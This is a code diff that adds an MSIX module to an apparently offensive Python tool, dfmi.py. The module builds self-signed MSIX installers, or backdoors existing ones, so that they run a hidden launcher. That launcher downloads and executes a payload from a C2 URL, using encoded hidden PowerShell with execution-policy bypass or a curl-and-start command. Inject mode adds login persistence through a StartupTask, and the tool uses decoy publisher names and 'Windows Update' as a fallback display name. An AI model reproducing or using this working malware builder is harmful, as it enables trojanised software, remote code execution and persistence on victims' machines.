@@ -3,6 +3,8 @@
 import sys
 import os
 import re
+import glob
+import html
 import base64
 import uuid
 import shutil
@@ -10,6 +12,7 @@ import subprocess
 import tempfile
 import random
 import string
+import zipfile
 
 BANNER = """
 		██████╗ ███████╗███╗   ███╗██╗
@@ -44,6 +47,11 @@ Commands:
               Windows Requirements: Uses embedded base MSI + PowerShell COM
               No original MSI needed. Fully customizable metadata.
 
+  msix        MSIX package operations (Windows only — requires Windows SDK)
+              stub    Build a self-signed MSIX that runs an arbitrary EXE on install
+              inject  Backdoor an existing MSIX with a StartupTask persistence entry
+              inspect Show MSIX contents and manifest summary (cross-platform)
+
 Options:
   -h, --help    Show this help
 
@@ -66,6 +74,10 @@ Examples:
   python3 dfmi.py stub --c2 http://<C2>/payload.ps1
   python3 dfmi.py stub --c2 http://<C2>/payload.ps1 --name "XXX Updater" --manufacturer "XXX Inc."
   python3 dfmi.py stub --c2 http://<C2>/loader.exe --mode cmd -o update.msi
+
+  python3 dfmi.py msix stub --c2 http://<C2>/payload.ps1 -o setup.msix
+  python3 dfmi.py msix inject base.msix patched.msix --c2 http://<C2>/payload.ps1
+  python3 dfmi.py msix inspect setup.msix
 
 Run 'python3 dfmi.py <command> --help' for command-specific help.
 """
@@ -1066,6 +1078,605 @@ def _parse_stub_args(args):
     if not c2_url: return None
     return c2_url, mode, name, manufacturer, version, output, action_name, prop_name, seq_num, drop_name
 
+# ─── MSIX Module ──────────────────────────────────────────────────────────
+
+# 1x1 transparent PNG for MSIX icon placeholders (makeappx /nv skips size checks)
+_PLACEHOLDER_PNG_B64 = (
+    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAC"
+    "hwGA60e6kgAAAABJRU5ErkJggg=="
+)
+
+HELP_MSIX = """
+Command: msix
+=============
+Create or backdoor MSIX packages.
+[Windows only for stub/inject — requires Windows SDK: makeappx + signtool]
+[inspect works cross-platform via Python zipfile]
+
+Subcommands:
+  stub     Create a standalone backdoored MSIX from scratch
+  inject   Add a StartupTask payload to an existing MSIX
+  inspect  Show manifest + file list of any MSIX
+
+Stub Usage:
+  python3 dfmi.py msix stub --c2 <url> [options]
+
+  --c2 <url>           Payload URL (required)
+  --mode ps|cmd        Delivery mode (default: ps)
+  --name <name>        App display name    (default: random)
+  --publisher <cn>     Publisher CN        (default: random)
+  --version <ver>      Package version     (default: 1.0.0.0)
+  --drop-name <name>   EXE drop name       (default: random, cmd mode)
+  -o <output.msix>     Output file         (default: stub.msix)
+
+Inject Usage:
+  python3 dfmi.py msix inject <target.msix> <output.msix> --c2 <url> [options]
+
+  --c2 <url>           Payload URL (required)
+  --mode ps|cmd        Delivery mode (default: ps)
+  --publisher <cn>     Publisher CN for re-signing (default: random)
+  --drop-name <name>   EXE drop name (default: random, cmd mode)
+
+Inspect Usage:
+  python3 dfmi.py msix inspect <target.msix>
+
+Key differences from MSI:
+  - No CustomActions: payload runs as main exe (stub) or StartupTask (inject)
+  - runFullTrust + Windows.FullTrustApplication: escapes AppContainer sandbox
+  - Mandatory signing: self-signed cert auto-generated, .cer produced alongside
+
+Install on target (run as Admin):
+  Import-Certificate -FilePath out.cer -CertStoreLocation cert:\\LocalMachine\\TrustedPeople
+  Add-AppxPackage -Path output.msix
+"""
+
+# ─── MSIX: Utilities ──────────────────────────────────────────────────────
+
+def _find_sdk_tool(name):
+    """Locate makeappx.exe or signtool.exe from any installed Windows SDK version."""
+    kits = r"C:\Program Files (x86)\Windows Kits\10\bin"
+    def _ver_key(path):
+        try:
+            ver_str = path.split(os.sep)[-3]
+            return tuple(int(x) for x in ver_str.split('.'))
+        except (ValueError, IndexError):
+            return (0,)
+    for arch in ('x64', 'x86'):
+        matches = glob.glob(os.path.join(kits, '*', arch, name))
+        if matches:
+            return max(matches, key=_ver_key)
+    return shutil.which(name)
+
+def _gen_publisher_cn():
+    """Generate a random-looking publisher Common Name."""
+    prefixes = ['Contoso', 'Fabrikam', 'Northwind', 'Woodgrove', 'Tailspin', 'Litware']
+    suffixes = ['Technologies', 'Software', 'Systems', 'Solutions', 'Enterprises', 'Corp']
+    return f"{random.choice(prefixes)} {random.choice(suffixes)}"
+
+def _msix_pkg_name(display_name):
+    """Derive a valid MSIX package Identity Name from a display name."""
+    return re.sub(r'[^A-Za-z0-9.]', '.', display_name).strip('.')
+
+# ─── MSIX: Manifest generation ────────────────────────────────────────────
+
+def _msix_manifest_stub(pkg_name, publisher_dn, version, exe_name, display_name):
+    """Generate a complete AppxManifest.xml for stub mode."""
+    xe_pkg  = html.escape(pkg_name,      quote=True)
+    xe_pub  = html.escape(publisher_dn,  quote=True)
+    xe_exe  = html.escape(exe_name,      quote=True)
+    xe_disp = html.escape(display_name,  quote=True)
+    return f"""<?xml version="1.0" encoding="utf-8"?>
+<Package xmlns="http://schemas.microsoft.com/appx/manifest/foundation/windows10"
+         xmlns:uap="http://schemas.microsoft.com/appx/manifest/uap/windows10"
+         xmlns:rescap="http://schemas.microsoft.com/appx/manifest/foundation/windows10/restrictedcapabilities"
+         IgnorableNamespaces="uap rescap">
+  <Identity Name="{xe_pkg}" Publisher="{xe_pub}"
+            Version="{version}" ProcessorArchitecture="x64" />
+  <Properties>
+    <DisplayName>{xe_disp}</DisplayName>
+    <PublisherDisplayName>{xe_disp}</PublisherDisplayName>
+    <Logo>Assets\\Square150x150Logo.png</Logo>
+  </Properties>
+  <Dependencies>
+    <TargetDeviceFamily Name="Windows.Desktop"
+      MinVersion="10.0.17763.0" MaxVersionTested="10.0.22000.0" />
+  </Dependencies>
+  <Resources>
+    <Resource Language="en-us" />
+  </Resources>
+  <Applications>
+    <Application Id="App" Executable="{xe_exe}"
+                 EntryPoint="Windows.FullTrustApplication">
+      <uap:VisualElements DisplayName="{xe_disp}" Description="{xe_disp}"
+        BackgroundColor="transparent"
+        Square150x150Logo="Assets\\Square150x150Logo.png"
+        Square44x44Logo="Assets\\Square44x44Logo.png" />
+    </Application>
+  </Applications>
+  <Capabilities>
+    <rescap:Capability Name="runFullTrust" />
+  </Capabilities>
+</Package>"""
+
+def _inject_manifest(xml_str, startup_exe, publisher_dn, task_id, display_name):
+    """
+    Modify an existing AppxManifest.xml for inject mode:
+    - Update Publisher DN to match our signing cert
+    - Add runFullTrust capability
+    - Add required namespace declarations (uap, uap3, rescap)
+    - Append a new Application with StartupTask extension
+    """
+    # Ensure required namespace declarations exist on <Package>
+    for prefix, uri in [
+        ('uap',   'http://schemas.microsoft.com/appx/manifest/uap/windows10'),
+        ('uap3',  'http://schemas.microsoft.com/appx/manifest/uap/windows10/3'),
+        ('rescap','http://schemas.microsoft.com/appx/manifest/foundation/windows10/restrictedcapabilities'),
+    ]:
+        decl = f'xmlns:{prefix}="{uri}"'
+        if decl not in xml_str:
+            xml_str = xml_str.replace('<Package ', f'<Package {decl}\n         ', 1)
+
+    # Update IgnorableNamespaces to include new prefixes
+    def _add_ignorable(m):
+        existing = m.group(1)
+        for p in ('uap', 'uap3', 'rescap'):
+            if p not in existing:
+                existing = p + ' ' + existing
+        return f'IgnorableNamespaces="{existing.strip()}"'
+    xml_str = re.sub(r'IgnorableNamespaces="([^"]*)"', _add_ignorable, xml_str)
+
+    # XML-escape all user-supplied values before interpolation
+    xe_pub  = html.escape(publisher_dn,  quote=True)
+    xe_exe  = html.escape(startup_exe,   quote=True)
+    xe_tid  = html.escape(task_id,       quote=True)
+    xe_disp = html.escape(display_name,  quote=True)
+
+    # Update Publisher DN in Identity element
+    xml_str = re.sub(r'Publisher="[^"]*"', f'Publisher="{xe_pub}"', xml_str, count=1)
+
+    # Add runFullTrust capability
+    if 'runFullTrust' not in xml_str:
+        rescap_cap = '    <rescap:Capability Name="runFullTrust" />'
+        if '<Capabilities>' in xml_str:
+            xml_str = xml_str.replace('</Capabilities>',
+                                      f'{rescap_cap}\n  </Capabilities>')
+        else:
+            xml_str = xml_str.replace('</Package>',
+                f'  <Capabilities>\n{rescap_cap}\n  </Capabilities>\n</Package>')
+
+    # Ensure IgnorableNamespaces includes new prefixes (add if absent)
+    if 'IgnorableNamespaces' not in xml_str:
+        xml_str = xml_str.replace('<Package ', '<Package IgnorableNamespaces="uap uap3 rescap"\n         ', 1)
+
+    # Append new Application with StartupTask before </Applications>
+    startup_id = gen_name()
+    new_app = f"""
+    <Application Id="{startup_id}" Executable="{xe_exe}"
+                 EntryPoint="Windows.FullTrustApplication">
+      <uap:VisualElements DisplayName="{xe_disp}" Description="{xe_disp}"
+        BackgroundColor="transparent"
+        Square150x150Logo="Assets\\Square150x150Logo.png"
+        Square44x44Logo="Assets\\Square44x44Logo.png" />
+      <Extensions>
+        <uap3:Extension Category="windows.startupTask">
+          <uap3:StartupTask TaskId="{xe_tid}" Enabled="true"
+                             DisplayName="{xe_disp}" />
+        </uap3:Extension>
+      </Extensions>
+    </Application>"""
+    xml_str = xml_str.replace('</Applications>', new_app + '\n  </Applications>')
+
+    return xml_str
+
+# ─── MSIX: PowerShell helpers ─────────────────────────────────────────────
+
+def _msix_launcher_ps(exec_path, exec_args, out_exe):
+    """
+    PowerShell script: compile a hidden C# launcher.exe via Add-Type.
+    exec_path / exec_args are embedded as C# string literals (backslash + quote escaped).
+    """
+    safe_out  = out_exe.replace("'", "''")
+    # Strip control characters that would break C# source or change semantics
+    ctrl_re = re.compile(r'[\x00-\x08\x0a-\x1f\x7f]')
+    exec_path = ctrl_re.sub('', exec_path)
+    exec_args = ctrl_re.sub('', exec_args)
+    # Escape for C# string literal: \ → \\, " → \"
+    cs_exec = exec_path.replace('\\', '\\\\').replace('"', '\\"')
+    cs_args = exec_args.replace('\\', '\\\\').replace('"', '\\"')
+    # C# source — embedded in PS single-quoted here-string (no PS expansion)
+    cs = f"""using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+public class P {{
+    [DllImport("user32.dll")]    static extern bool ShowWindow(IntPtr h, int n);
+    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
+    [STAThread] static void Main() {{
+        ShowWindow(GetConsoleWindow(), 0);
+        try {{
+            var psi = new ProcessStartInfo("{cs_exec}", "{cs_args}");
+            psi.WindowStyle   = ProcessWindowStyle.Hidden;
+            psi.CreateNoWindow = true;
+            Process.Start(psi);
+        }} catch {{}}
+    }}
+}}"""
+    return f"""
+$code = @'
+{cs}
+'@
+try {{
+    Add-Type -TypeDefinition $code -OutputAssembly '{safe_out}' `
+             -OutputType ConsoleApplication -ErrorAction Stop
+}} catch {{
+    Write-Host "COMPILE_FAIL: $_"; exit 1
+}}
+if (Test-Path '{safe_out}') {{ Write-Host 'COMPILE_OK' }} else {{ Write-Host 'COMPILE_FAIL'; exit 1 }}
+"""
+
+def _msix_cert_ps(cn, out_dir):
+    """PowerShell script: generate self-signed code-signing cert, export .pfx + .cer."""
+    pfx = os.path.join(out_dir, 'signing.pfx').replace("'", "''")
+    cer = os.path.join(out_dir, 'signing.cer').replace("'", "''")
+    safe_cn = cn.replace("'", "''")
+    return f"""
+$pfxPass = ConvertTo-SecureString -String 'dfmi123' -Force -AsPlainText
+$cert = New-SelfSignedCertificate -Type Custom -Subject 'CN={safe_cn}' `
+    -KeyUsage DigitalSignature -FriendlyName '{safe_cn}' `
+    -CertStoreLocation 'Cert:\\CurrentUser\\My' `
+    -TextExtension @('2.5.29.37={{text}}1.3.6.1.5.5.7.3.3','2.5.29.19={{text}}')
+Export-PfxCertificate -Cert $cert -FilePath '{pfx}' -Password $pfxPass | Out-Null
+Export-Certificate -Cert $cert -FilePath '{cer}' | Out-Null
+Remove-Item "Cert:\\CurrentUser\\My\\$($cert.Thumbprint)" -Force -ErrorAction SilentlyContinue
+if ((Test-Path '{pfx}') -and (Test-Path '{cer}')) {{
+    Write-Host 'CERT_OK'
+}} else {{ Write-Host 'CERT_FAIL'; exit 1 }}
+"""
+
+def _msix_sign_ps(msix_path, pfx_path, pfx_pass, signtool_path):
+    """PowerShell script: sign MSIX with signtool."""
+    safe_msix    = msix_path.replace("'", "''")
+    safe_pfx     = pfx_path.replace("'", "''")
+    safe_sign    = signtool_path.replace("'", "''")
+    return f"""
+$out = & '{safe_sign}' sign /fd SHA256 /a /f '{safe_pfx}' /p '{pfx_pass}' '{safe_msix}' 2>&1
+if ($LASTEXITCODE -eq 0) {{ Write-Host 'SIGN_OK' }} else {{ Write-Host "SIGN_FAIL: $out"; exit 1 }}
+"""
+
+# ─── MSIX: Shared cert+sign pipeline ──────────────────────────────────────
+
+def _msix_cert_and_sign(msix_unsigned, output, out_dir, publisher_cn, signtool):
+    """Generate cert, sign MSIX, copy .cer alongside output. Returns True on success."""
+    cer_out = os.path.splitext(output)[0] + '.cer'
+    pfx_path = os.path.join(out_dir, 'signing.pfx')
+    cer_path = os.path.join(out_dir, 'signing.cer')
+    pfx_pass = 'dfmi123'
+
+    print("[*] Generating self-signed certificate...")
+    ok, stdout, stderr = run_ps(_msix_cert_ps(publisher_cn, out_dir))
+    if not ok or 'CERT_OK' not in stdout:
+        print(f"[!] Certificate failed: {stderr}"); return False
+    print("    OK")
+
+    print("[*] Signing MSIX...")
+    ok, stdout, stderr = run_ps(_msix_sign_ps(msix_unsigned, pfx_path, pfx_pass, signtool))
+    if not ok or 'SIGN_OK' not in stdout:
+        print(f"[!] Signing failed: {stdout} {stderr}"); return False
+    print("    OK")
+
+    shutil.copy(msix_unsigned, output)
+    shutil.copy(cer_path, cer_out)
+    return cer_out
+
+# ─── MSIX: Stub ───────────────────────────────────────────────────────────
+
+def _stub_msix_windows(c2_url, mode, name, publisher_cn, version, output, drop_name):
+    if not is_windows():
+        print("[!] msix stub requires Windows."); return False
+
+    makeappx = _find_sdk_tool('makeappx.exe')
+    signtool  = _find_sdk_tool('signtool.exe')
+    for tool, path in [('makeappx.exe', makeappx), ('signtool.exe', signtool)]:
+        if not path:
+            print(f"[!] {tool} not found. Install Windows SDK 10.")
+            print("    https://developer.microsoft.com/windows/downloads/windows-sdk/")
+            return False
+
+    output       = os.path.abspath(output)
+    publisher_dn = f"CN={publisher_cn}"
+    pkg_name     = _msix_pkg_name(name)
+
+    # Build payload launcher args
+    if mode == 'ps':
+        ca        = build_ca_ps(c2_url, drop_name)
+        b64_enc   = ca.split('-Enc ')[1].split(' &')[0]
+        exec_path = 'powershell.exe'
+        exec_args = f'-NoP -W Hidden -NonI -Exec Bypass -Enc {b64_enc}'
+    else:
+        dn        = drop_name or gen_drop_name()
+        exec_path = 'cmd.exe'
+        exec_args = f'/c "curl -s {c2_url} -o %TEMP%\\{dn} && start /b %TEMP%\\{dn}"'
+
+    tmpdir = tempfile.mkdtemp()
+    try:
+        pkg_dir    = os.path.join(tmpdir, 'pkg')
+        assets_dir = os.path.join(pkg_dir, 'Assets')
+        os.makedirs(assets_dir)
+
+        # Placeholder icons (makeappx /nv skips validation)
+        icon_data = base64.b64decode(_PLACEHOLDER_PNG_B64)
+        for icon in ['Square150x150Logo.png', 'Square44x44Logo.png']:
+            with open(os.path.join(assets_dir, icon), 'wb') as f:
+                f.write(icon_data)
+
+        # Compile launcher.exe
+        launcher = os.path.join(pkg_dir, 'launcher.exe')
+        print("[*] Compiling launcher.exe via Add-Type...")
+        ok, stdout, stderr = run_ps(_msix_launcher_ps(exec_path, exec_args, launcher))
+        if not ok or 'COMPILE_OK' not in stdout:
+            print(f"[!] Compilation failed: {stderr}"); return False
+        print("    OK")
+
+        # Write manifest
+        manifest = _msix_manifest_stub(pkg_name, publisher_dn, version, 'launcher.exe', name)
+        with open(os.path.join(pkg_dir, 'AppxManifest.xml'), 'w', encoding='utf-8') as f:
+            f.write(manifest)
+
+        # Pack
+        msix_unsigned = os.path.join(tmpdir, 'unsigned.msix')
+        print("[*] Packing MSIX...")
+        r = subprocess.run([makeappx, 'pack', '/d', pkg_dir, '/p', msix_unsigned, '/nv', '/o'],
+                           capture_output=True, text=True)
+        if r.returncode != 0:
+            print(f"[!] makeappx pack failed: {r.stderr.strip()}"); return False
+        print(f"    OK ({os.path.getsize(msix_unsigned):,} bytes)")
+
+        # Cert + sign + copy
+        cer_out = _msix_cert_and_sign(msix_unsigned, output,
+                                       tmpdir, publisher_cn, signtool)
+        if not cer_out:
+            return False
+
+        size = os.path.getsize(output)
+        print(f"\n[+] MSIX  : {output} ({size:,} bytes)")
+        print(f"[+] Cert  : {cer_out}")
+        print()
+        print("=" * 60)
+        print("TRUST CERT on target (run as Admin):")
+        print(f'  Import-Certificate -FilePath "{os.path.basename(cer_out)}" \\')
+        print('    -CertStoreLocation cert:\\LocalMachine\\TrustedPeople')
+        print()
+        print("INSTALL:")
+        print(f'  Add-AppxPackage -Path "{os.path.basename(output)}"')
+        print()
+        print("ARTIFACT-FREE UNINSTALL:")
+        print(f'  Get-AppxPackage *{pkg_name}* | Remove-AppxPackage')
+        print("=" * 60)
+        return True
+    finally:
+        shutil.rmtree(tmpdir, ignore_errors=True)
+
+# ─── MSIX: Inject ─────────────────────────────────────────────────────────
+
+def _inject_msix_windows(target, output, c2_url, mode, publisher_cn, drop_name):
+    if not is_windows():
+        print("[!] msix inject requires Windows."); return False
+    if not os.path.exists(target):
+        print(f"[!] File not found: {target}"); return False
+
+    makeappx = _find_sdk_tool('makeappx.exe')
+    signtool  = _find_sdk_tool('signtool.exe')
+    for tool, path in [('makeappx.exe', makeappx), ('signtool.exe', signtool)]:
+        if not path:
+            print(f"[!] {tool} not found. Install Windows SDK 10."); return False
+
+    target       = os.path.abspath(target)
+    output       = os.path.abspath(output)
+    publisher_dn = f"CN={publisher_cn}"
+    task_id      = gen_name(8)
+    startup_name = gen_name(6).lower() + '.exe'
+
+    # Build payload launcher args (same as stub)
+    if mode == 'ps':
+        ca        = build_ca_ps(c2_url, drop_name)
+        b64_enc   = ca.split('-Enc ')[1].split(' &')[0]
+        exec_path = 'powershell.exe'
+        exec_args = f'-NoP -W Hidden -NonI -Exec Bypass -Enc {b64_enc}'
+    else:
+        dn        = drop_name or gen_drop_name()
+        exec_path = 'cmd.exe'
+        exec_args = f'/c "curl -s {c2_url} -o %TEMP%\\{dn} && start /b %TEMP%\\{dn}"'
+
+    tmpdir = tempfile.mkdtemp()
+    try:
+        pkg_dir = os.path.join(tmpdir, 'pkg')
+        os.makedirs(pkg_dir)
+
+        # Unpack original MSIX
+        print(f"[*] Unpacking {os.path.basename(target)}...")
+        r = subprocess.run([makeappx, 'unpack', '/p', target, '/d', pkg_dir, '/nv'],
+                           capture_output=True, text=True)
+        if r.returncode != 0:
+            print(f"[!] makeappx unpack failed: {r.stderr.strip()}"); return False
+        print(f"    OK ({len(os.listdir(pkg_dir))} items)")
+
+        # Read and modify manifest
+        manifest_path = os.path.join(pkg_dir, 'AppxManifest.xml')
+        if not os.path.exists(manifest_path):
+            print("[!] AppxManifest.xml not found in MSIX"); return False
+        with open(manifest_path, 'r', encoding='utf-8') as f:
+            manifest_xml = f.read()
+
+        # Derive a display name from existing manifest
+        m = re.search(r'<DisplayName>([^<]+)</DisplayName>', manifest_xml)
+        display_name = m.group(1) if m else "Windows Update"
+
+        print(f"[*] Modifying manifest (task={task_id}, startup={startup_name})...")
+        modified_xml = _inject_manifest(manifest_xml, startup_name,
+                                         publisher_dn, task_id, display_name)
+        with open(manifest_path, 'w', encoding='utf-8') as f:
+            f.write(modified_xml)
+        print("    OK")
+
+        # Ensure Assets/ exists with placeholder icons
+        assets_dir = os.path.join(pkg_dir, 'Assets')
+        os.makedirs(assets_dir, exist_ok=True)
+        icon_data = base64.b64decode(_PLACEHOLDER_PNG_B64)
+        for icon in ['Square150x150Logo.png', 'Square44x44Logo.png']:
+            icon_path = os.path.join(assets_dir, icon)
+            if not os.path.exists(icon_path):
+                with open(icon_path, 'wb') as f:
+                    f.write(icon_data)
+
+        # Compile startup.exe
+        startup_path = os.path.join(pkg_dir, startup_name)
+        print(f"[*] Compiling {startup_name} via Add-Type...")
+        ok, stdout, stderr = run_ps(_msix_launcher_ps(exec_path, exec_args, startup_path))
+        if not ok or 'COMPILE_OK' not in stdout:
+            print(f"[!] Compilation failed: {stderr}"); return False
+        print("    OK")
+
+        # Repack
+        msix_unsigned = os.path.join(tmpdir, 'unsigned.msix')
+        print("[*] Repacking MSIX...")
+        r = subprocess.run([makeappx, 'pack', '/d', pkg_dir, '/p', msix_unsigned, '/nv', '/o'],
+                           capture_output=True, text=True)
+        if r.returncode != 0:
+            print(f"[!] makeappx pack failed: {r.stderr.strip()}"); return False
+        print(f"    OK ({os.path.getsize(msix_unsigned):,} bytes)")
+
+        # Cert + sign + copy
+        cer_out = _msix_cert_and_sign(msix_unsigned, output,
+                                       tmpdir, publisher_cn, signtool)
+        if not cer_out:
+            return False
+
+        size = os.path.getsize(output)
+        print(f"\n[+] MSIX  : {output} ({size:,} bytes)")
+        print(f"[+] Cert  : {cer_out}")
+        print(f"[+] Payload fires: on user login (StartupTask '{task_id}')")
+        print()
+        print("=" * 60)
+        print("TRUST CERT on target (run as Admin):")
+        print(f'  Import-Certificate -FilePath "{os.path.basename(cer_out)}" \\')
+        print('    -CertStoreLocation cert:\\LocalMachine\\TrustedPeople')
+        print()
+        print("INSTALL:")
+        print(f'  Add-AppxPackage -Path "{os.path.basename(output)}"')
+        print("=" * 60)
+        return True
+    finally:
+        shutil.rmtree(tmpdir, ignore_errors=True)
+
+# ─── MSIX: Inspect (cross-platform) ───────────────────────────────────────
+
+def _inspect_msix(msix_path):
+    if not os.path.exists(msix_path):
+        print(f"[!] File not found: {msix_path}"); return
+    print(f"\n{'='*60}\n  MSIX: {msix_path}\n{'='*60}")
+    try:
+        with zipfile.ZipFile(msix_path, 'r') as z:
+            names = z.namelist()
+            print(f"\n[Files] ({len(names)} total)")
+            for info in sorted(z.infolist(), key=lambda x: x.file_size, reverse=True):
+                print(f"  {info.filename:<55} {info.file_size:>10,}")
+            print("\n[AppxManifest.xml — key lines]")
+            if 'AppxManifest.xml' in names:
+                xml = z.read('AppxManifest.xml').decode('utf-8', errors='replace')
+                keywords = ('Identity', 'Publisher', 'Application', 'Executable',
+                            'StartupTask', 'Capability', 'DisplayName', 'EntryPoint')
+                for line in xml.splitlines():
+                    if any(kw in line for kw in keywords):
+                        print(f"  {line.strip()[:110]}")
+            else:
+                print("  (AppxManifest.xml not found)")
+            if 'AppxSignature.p7x' in names:
+                print("\n[Signature] present (AppxSignature.p7x)")
+            else:
+                print("\n[Signature] NOT present (unsigned)")
+    except zipfile.BadZipFile:
+        print("[!] Not a valid ZIP/MSIX file")
+    print()
+
+# ─── MSIX: CLI ────────────────────────────────────────────────────────────
+
+def cmd_msix(args):
+    if not args or args[0] in ('-h', '--help'):
+        print(HELP_MSIX); return
+    sub = args[0]; rest = args[1:]
+    if sub == 'stub':
+        if not rest or rest[0] in ('-h', '--help'): print(HELP_MSIX); return
+        parsed = _parse_msix_stub_args(rest)
+        if parsed is None: print("[!] --c2 <url> is required.\n"); print(HELP_MSIX); return
+        c2_url, mode, name, publisher_cn, version, output, drop_name = parsed
+        print(f"[*] C2 URL   : {c2_url}")
+        print(f"[*] Mode     : {mode}")
+        print(f"[*] Name     : {name}")
+        print(f"[*] Publisher: {publisher_cn}")
+        print(f"[*] Version  : {version}")
+        print(f"[*] Output   : {output}")
+        print()
+        _stub_msix_windows(c2_url, mode, name, publisher_cn, version, output, drop_name)
+    elif sub == 'inject':
+        if len(rest) < 3 or rest[0] in ('-h', '--help'): print(HELP_MSIX); return
+        parsed = _parse_msix_inject_args(rest)
+        if parsed is None: print("[!] --c2 <url> is required.\n"); print(HELP_MSIX); return
+        target, output, c2_url, mode, publisher_cn, drop_name = parsed
+        if not os.path.exists(target):
+            print(f"[!] Target not found: {target}"); return
+        print(f"[*] Target   : {target}")
+        print(f"[*] Output   : {output}")
+        print(f"[*] C2 URL   : {c2_url}")
+        print(f"[*] Mode     : {mode}")
+        print(f"[*] Publisher: {publisher_cn}")
+        print()
+        _inject_msix_windows(target, output, c2_url, mode, publisher_cn, drop_name)
+    elif sub == 'inspect':
+        if not rest: print("[!] Usage: msix inspect <file.msix>"); return
+        _inspect_msix(rest[0])
+    else:
+        print(f"[!] Unknown msix subcommand: {sub}"); print(HELP_MSIX)
+
+def _parse_msix_stub_args(args):
+    c2_url = None; mode = 'ps'; drop_name = None
+    name         = None
+    publisher_cn = None
+    version      = '1.0.0.0'
+    output       = 'stub.msix'
+    i = 0
+    while i < len(args):
+        a = args[i]
+        if a == '--c2' and i+1 < len(args):          c2_url       = args[i+1]; i += 2
+        elif a == '--mode' and i+1 < len(args):       mode         = args[i+1]; i += 2
+        elif a == '--name' and i+1 < len(args):       name         = args[i+1]; i += 2
+        elif a == '--publisher' and i+1 < len(args):  publisher_cn = args[i+1]; i += 2
+        elif a == '--version' and i+1 < len(args):    version      = args[i+1]; i += 2
+        elif a == '--drop-name' and i+1 < len(args):  drop_name    = args[i+1]; i += 2
+        elif a in ('-o', '--output') and i+1 < len(args): output   = args[i+1]; i += 2
+        elif a in ('-h', '--help'): return 'help'
+        else: i += 1
+    if not c2_url: return None
+    if name is None:         name         = _gen_publisher_cn()
+    if publisher_cn is None: publisher_cn = _gen_publisher_cn()
+    return c2_url, mode, name, publisher_cn, version, output, drop_name
+
+def _parse_msix_inject_args(args):
+    if len(args) < 2: return None
+    target = args[0]; output = args[1]; rest = args[2:]
+    c2_url = None; mode = 'ps'; drop_name = None; publisher_cn = None
+    i = 0
+    while i < len(rest):
+        a = rest[i]
+        if a == '--c2' and i+1 < len(rest):          c2_url       = rest[i+1]; i += 2
+        elif a == '--mode' and i+1 < len(rest):       mode         = rest[i+1]; i += 2
+        elif a == '--publisher' and i+1 < len(rest):  publisher_cn = rest[i+1]; i += 2
+        elif a == '--drop-name' and i+1 < len(rest):  drop_name    = rest[i+1]; i += 2
+        elif a in ('-h', '--help'): return 'help'
+        else: i += 1
+    if not c2_url: return None
+    if publisher_cn is None: publisher_cn = _gen_publisher_cn()
+    return target, output, c2_url, mode, publisher_cn, drop_name
+
+
 if __name__ == "__main__":
     print(BANNER)
     if len(sys.argv) < 2 or sys.argv[1] in ('-h', '--help'):
@@ -1075,6 +1686,7 @@ if __name__ == "__main__":
     if command == 'inject': cmd_inject(rest)
     elif command == 'rogue-mst': cmd_rogue_mst(rest)
     elif command == 'stub': cmd_stub(rest)
+    elif command == 'msix': cmd_msix(rest)
     else:
         print(f"[!] Unknown command: {command}\n")
         print(HELP_MAIN); sys.exit(1)
